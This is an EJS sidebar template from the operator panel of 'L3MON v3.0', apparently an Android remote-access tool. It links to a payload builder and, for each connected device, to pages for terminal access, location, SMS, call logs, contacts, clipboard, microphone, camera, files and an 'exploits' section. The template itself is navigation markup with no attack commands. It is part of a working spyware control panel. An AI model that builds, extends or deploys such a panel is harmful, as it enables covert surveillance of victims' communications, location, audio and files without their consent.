<!-- Sidebar -->
<div id="sidebar" class="fixed left-0 top-14 bottom-0 w-56 bg-bg-sidebar border-r border-slate-700/50 z-40 flex flex-col py-4 overflow-y-auto">
    <nav class="flex-1 px-3 space-y-1">
        <!-- ===== GLOBAL SECTION ===== -->
        <div class="px-3 py-1.5">
            <span class="text-slate-600 text-xs font-semibold uppercase tracking-wider">Overview</span>
        </div>
        <a href="/" class="flex items-center gap-3 px-3 py-2.5 rounded-lg text-sm font-medium transition-all
            <% if (typeof page !== 'undefined' && page === 'dashboard') { %> bg-accent-blue/10 text-accent-blue <% } else { %> text-slate-400 hover:text-white hover:bg-bg-hover <% } %>">
            <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 12l2-2m0 0l7-7 7 7M5 10v10a1 1 0 001 1h3m10-11l2 2m-2-2v10a1 1 0 01-1 1h-3m-6 0a1 1 0 001-1v-4a1 1 0 011-1h2a1 1 0 011 1v4a1 1 0 001 1m-6 0h6"/></svg>
            Dashboard
        </a>
        <a href="/logs" class="flex items-center gap-3 px-3 py-2.5 rounded-lg text-sm font-medium transition-all
            <% if (typeof page !== 'undefined' && page === 'logs') { %> bg-accent-blue/10 text-accent-blue <% } else { %> text-slate-400 hover:text-white hover:bg-bg-hover <% } %>">
            <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5H7a2 2 0 00-2 2v12a2 2 0 002 2h10a2 2 0 002-2V7a2 2 0 00-2-2h-2M9 5a2 2 0 002 2h2a2 2 0 002-2M9 5a2 2 0 012-2h2a2 2 0 012 2m-3 7h3m-3 4h3m-6-4h.01M9 16h.01"/></svg>
            Event Log
        </a>
        <a href="/builder" class="flex items-center gap-3 px-3 py-2.5 rounded-lg text-sm font-medium transition-all
            <% if (typeof page !== 'undefined' && page === 'builder') { %> bg-accent-blue/10 text-accent-blue <% } else { %> text-slate-400 hover:text-white hover:bg-bg-hover <% } %>">
            <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 16v1a3 3 0 003 3h10a3 3 0 003-3v-1m-4-8l-4-4m0 0L8 8m4-4v12"/></svg>
            Build Payload
        </a>

        <!-- ===== DEVICE SECTION ===== -->
        <div class="px-3 pt-4 pb-1.5">
            <span class="text-slate-600 text-xs font-semibold uppercase tracking-wider">Device</span>
        </div>

        <!-- Back to Dashboard + Device Selector -->
        <% if (typeof deviceID !== 'undefined' && deviceID) { %>
        <a href="/" class="flex items-center gap-2 px-3 py-2 rounded-lg text-xs font-medium text-slate-500 hover:text-white hover:bg-bg-hover transition-all mb-2">
            <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 19l-7-7m0 0l7-7m-7 7h18"/></svg>
            Back to Dashboard
        </a>

        <!-- Selected Device Indicator -->
        <div class="px-3 py-2.5 bg-accent-blue/10 border border-accent-blue/20 rounded-lg mb-2">
            <div class="flex items-center gap-2">
                <span class="status-online flex-shrink-0"></span>
                <div class="min-w-0 flex-1">
                    <% let selectedClient = (typeof allClients !== 'undefined' ? allClients : []).find(c => c.clientID === deviceID); %>
                    <div class="text-white text-sm font-medium truncate">
                        <%= selectedClient ? (selectedClient.nickname || selectedClient.model) : 'Device' %>
                    </div>
                    <div class="text-slate-500 text-xs font-mono truncate"><%= deviceID %></div>
                </div>
                <button onclick="renameDevice()" class="text-slate-500 hover:text-accent-blue transition-colors" title="Rename device">
                    <svg class="w-3.5 h-3.5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15.232 5.232l3.536 3.536m-2.036-5.036a2.5 2.5 0 113.536 3.536L6.5 21.036H3v-3.572L16.732 3.732z"/></svg>
                </button>
            </div>
        </div>
        <script>
        function renameDevice() {
            var current = '<%= selectedClient ? (selectedClient.nickname || '') : '' %>';
            var name = prompt('Set device nickname:', current);
            if (name !== null && name.trim()) {
                $.post('/manage/<%= deviceID %>/nickname', { nickname: name.trim() }, function(d) {
                    if (d.error) showNotification('#f03434', d.error);
                    else { showNotification('#2ecc71', d.message); setTimeout(function(){ window.location.reload(); }, 500); }
                });
            }
        }
        </script>

        <!-- Device Switcher Dropdown -->
        <% if (typeof allClients !== 'undefined' && allClients.length > 1) { %>
        <div class="px-1 mb-2">
            <select id="deviceSwitcher" onchange="if(this.value) window.location='/manage/'+this.value+'/info'" class="w-full px-3 py-2 bg-bg-card border border-slate-700 rounded-lg text-slate-300 text-xs cursor-pointer hover:border-accent-blue focus:border-accent-blue outline-none transition-all">
                <option value="">Switch device...</option>
                <% allClients.forEach(function(c) { %>
                <option value="<%= c.clientID %>" <%= c.clientID === deviceID ? 'selected' : '' %>>
                    <%= c.model %> (<%= c.isOnline ? 'Online' : 'Offline' %>) - <%= c.clientID.substring(0,8) %>...
                </option>
                <% }); %>
            </select>
        </div>
        <% } %>

        <!-- Device Pages -->
        <a href="/manage/<%= deviceID %>/info" class="flex items-center gap-3 px-3 py-2.5 rounded-lg text-sm font-medium transition-all
            <% if (typeof page !== 'undefined' && page === 'info') { %> bg-accent-blue/10 text-accent-blue <% } else { %> text-slate-400 hover:text-white hover:bg-bg-hover <% } %>">
            <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"/></svg>
            Device Info
        </a>
        <a href="/manage/<%= deviceID %>/terminal" class="flex items-center gap-3 px-3 py-2.5 rounded-lg text-sm font-medium transition-all
            <% if (typeof page !== 'undefined' && page === 'terminal') { %> bg-accent-blue/10 text-accent-blue <% } else { %> text-slate-400 hover:text-white hover:bg-bg-hover <% } %>">
            <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 9l3 3-3 3m5 0h3M5 20h14a2 2 0 002-2V6a2 2 0 00-2-2H5a2 2 0 00-2 2v12a2 2 0 002 2z"/></svg>
            Terminal
        </a>
        <a href="/manage/<%= deviceID %>/location" class="flex items-center gap-3 px-3 py-2.5 rounded-lg text-sm font-medium transition-all
            <% if (typeof page !== 'undefined' && page === 'location') { %> bg-accent-blue/10 text-accent-blue <% } else { %> text-slate-400 hover:text-white hover:bg-bg-hover <% } %>">
            <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M17.657 16.657L13.414 20.9a1.998 1.998 0 01-2.827 0l-4.244-4.243a8 8 0 1111.314 0z"/><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 11a3 3 0 11-6 0 3 3 0 016 0z"/></svg>
            Location
        </a>
        <a href="/manage/<%= deviceID %>/sms" class="flex items-center gap-3 px-3 py-2.5 rounded-lg text-sm font-medium transition-all
            <% if (typeof page !== 'undefined' && page === 'sms') { %> bg-accent-blue/10 text-accent-blue <% } else { %> text-slate-400 hover:text-white hover:bg-bg-hover <% } %>">
            <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 10h.01M12 10h.01M16 10h.01M9 16H5a2 2 0 01-2-2V6a2 2 0 012-2h14a2 2 0 012 2v8a2 2 0 01-2 2h-5l-5 5v-5z"/></svg>
            SMS
        </a>
        <a href="/manage/<%= deviceID %>/calls" class="flex items-center gap-3 px-3 py-2.5 rounded-lg text-sm font-medium transition-all
            <% if (typeof page !== 'undefined' && page === 'calls') { %> bg-accent-blue/10 text-accent-blue <% } else { %> text-slate-400 hover:text-white hover:bg-bg-hover <% } %>">
            <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 5a2 2 0 012-2h3.28a1 1 0 01.948.684l1.498 4.493a1 1 0 01-.502 1.21l-2.257 1.13a11.042 11.042 0 005.516 5.516l1.13-2.257a1 1 0 011.21-.502l4.493 1.498a1 1 0 01.684.949V19a2 2 0 01-2 2h-1C9.716 21 3 14.284 3 6V5z"/></svg>
            Calls
        </a>
        <a href="/manage/<%= deviceID %>/contacts" class="flex items-center gap-3 px-3 py-2.5 rounded-lg text-sm font-medium transition-all
            <% if (typeof page !== 'undefined' && page === 'contacts') { %> bg-accent-blue/10 text-accent-blue <% } else { %> text-slate-400 hover:text-white hover:bg-bg-hover <% } %>">
            <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M17 20h5v-2a3 3 0 00-5.356-1.857M17 20H7m10 0v-2c0-.656-.126-1.283-.356-1.857M7 20H2v-2a3 3 0 015.356-1.857M7 20v-2c0-.656.126-1.283.356-1.857m0 0a5.002 5.002 0 019.288 0M15 7a3 3 0 11-6 0 3 3 0 016 0zm6 3a2 2 0 11-4 0 2 2 0 014 0zM7 10a2 2 0 11-4 0 2 2 0 014 0z"/></svg>
            Contacts
        </a>
        <a href="/manage/<%= deviceID %>/clipboard" class="flex items-center gap-3 px-3 py-2.5 rounded-lg text-sm font-medium transition-all
            <% if (typeof page !== 'undefined' && page === 'clipboard') { %> bg-accent-blue/10 text-accent-blue <% } else { %> text-slate-400 hover:text-white hover:bg-bg-hover <% } %>">
            <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5H7a2 2 0 00-2 2v12a2 2 0 002 2h10a2 2 0 002-2V7a2 2 0 00-2-2h-2M9 5a2 2 0 002 2h2a2 2 0 002-2M9 5a2 2 0 012-2h2a2 2 0 012 2"/></svg>
            Clipboard
        </a>
        <a href="/manage/<%= deviceID %>/microphone" class="flex items-center gap-3 px-3 py-2.5 rounded-lg text-sm font-medium transition-all
            <% if (typeof page !== 'undefined' && page === 'microphone') { %> bg-accent-blue/10 text-accent-blue <% } else { %> text-slate-400 hover:text-white hover:bg-bg-hover <% } %>">
            <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 11a7 7 0 01-7 7m0 0a7 7 0 01-7-7m7 7v4m0 0H8m4 0h4m-4-8a3 3 0 01-3-3V5a3 3 0 116 0v6a3 3 0 01-3 3z"/></svg>
            Microphone
        </a>
        <a href="/manage/<%= deviceID %>/camera" class="flex items-center gap-3 px-3 py-2.5 rounded-lg text-sm font-medium transition-all
            <% if (typeof page !== 'undefined' && page === 'camera') { %> bg-accent-blue/10 text-accent-blue <% } else { %> text-slate-400 hover:text-white hover:bg-bg-hover <% } %>">
            <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 10l4.553-2.276A1 1 0 0121 8.618v6.764a1 1 0 01-1.447.894L15 14M5 18h8a2 2 0 002-2V8a2 2 0 00-2-2H5a2 2 0 00-2 2v8a2 2 0 002 2z"/></svg>
            Camera
        </a>
        <a href="/manage/<%= deviceID %>/files" class="flex items-center gap-3 px-3 py-2.5 rounded-lg text-sm font-medium transition-all
            <% if (typeof page !== 'undefined' && page === 'files') { %> bg-accent-blue/10 text-accent-blue <% } else { %> text-slate-400 hover:text-white hover:bg-bg-hover <% } %>">
            <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 7v10a2 2 0 002 2h14a2 2 0 002-2V9a2 2 0 00-2-2h-6l-2-2H5a2 2 0 00-2 2z"/></svg>
            Files
        </a>
        <a href="/manage/<%= deviceID %>/alpine" class="flex items-center gap-3 px-3 py-2.5 rounded-lg text-sm font-medium transition-all
            <% if (typeof page !== 'undefined' && (page === 'alpine' || page === 'packages' || page === 'exploits')) { %> bg-accent-blue/10 text-accent-blue <% } else { %> text-slate-400 hover:text-white hover:bg-bg-hover <% } %>">
            <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 7v10c0 2.21 3.582 4 8 4s8-1.79 8-4V7M4 7c0 2.21 3.582 4 8 4s8-1.79 8-4M4 7c0-2.21 3.582-4 8-4s8 1.79 8 4"/></svg>
            Alpine Linux
        </a>
        <a href="/manage/<%= deviceID %>/settings" class="flex items-center gap-3 px-3 py-2.5 rounded-lg text-sm font-medium transition-all
            <% if (typeof page !== 'undefined' && page === 'settings') { %> bg-accent-blue/10 text-accent-blue <% } else { %> text-slate-400 hover:text-white hover:bg-bg-hover <% } %>">
            <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10.325 4.317c.426-1.756 2.924-1.756 3.35 0a1.724 1.724 0 002.573 1.066c1.543-.94 3.31.826 2.37 2.37a1.724 1.724 0 001.066 2.573c1.756.426 1.756 2.924 0 3.35a1.724 1.724 0 00-1.066 2.573c.94 1.543-.826 3.31-2.37 2.37a1.724 1.724 0 00-2.573 1.066c-.426 1.756-2.924 1.756-3.35 0a1.724 1.724 0 00-2.573-1.066c-1.543.94-3.31-.826-2.37-2.37a1.724 1.724 0 00-1.066-2.573c-1.756-.426-1.756-2.924 0-3.35a1.724 1.724 0 001.066-2.573c-.94-1.543.826-3.31 2.37-2.37.996.608 2.293.07 2.572-1.065z"/><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"/></svg>
            Settings
        </a>
        <% } else { %>
        <!-- No device selected - show device list -->
        <% if (typeof allClients !== 'undefined' && allClients.length > 0) { %>
        <% allClients.forEach(function(c) { %>
        <a href="/manage/<%= c.clientID %>/info" class="flex items-center gap-3 px-3 py-2.5 rounded-lg text-sm font-medium transition-all text-slate-400 hover:text-white hover:bg-bg-hover">
            <span class="<%= c.isOnline ? 'status-online' : 'status-offline' %> flex-shrink-0"></span>
            <div class="min-w-0 flex-1">
                <div class="truncate"><%= c.nickname || c.model %></div>
                <div class="text-slate-600 text-xs truncate"><%= c.model %></div>
            </div>
            <svg class="w-4 h-4 text-slate-600 flex-shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7"/></svg>
        </a>
        <% }); %>
        <% } else { %>
        <div class="px-3 py-4 text-center">
            <p class="text-slate-600 text-xs">No devices connected</p>
            <a href="/builder" class="text-accent-blue text-xs hover:underline mt-1 inline-block">Build Payload</a>
        </div>
        <% } %>
        <% } %>
    </nav>
    <div class="px-3 mt-4 pt-4 border-t border-slate-700/50">
        <a href="/logout" class="flex items-center gap-3 px-3 py-2.5 rounded-lg text-sm font-medium text-slate-400 hover:text-white hover:bg-bg-hover transition-all">
            <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M17 16l4-4m0 0l-4-4m4 4H7m6 4v1a3 3 0 01-3 3H6a3 3 0 01-3-3V7a3 3 0 013-3h4a3 3 0 013 3v1"/></svg>
            Logout
        </a>
        <p class="text-slate-600 text-xs text-center mt-3">L3MON v3.0</p>
    </div>
</div>
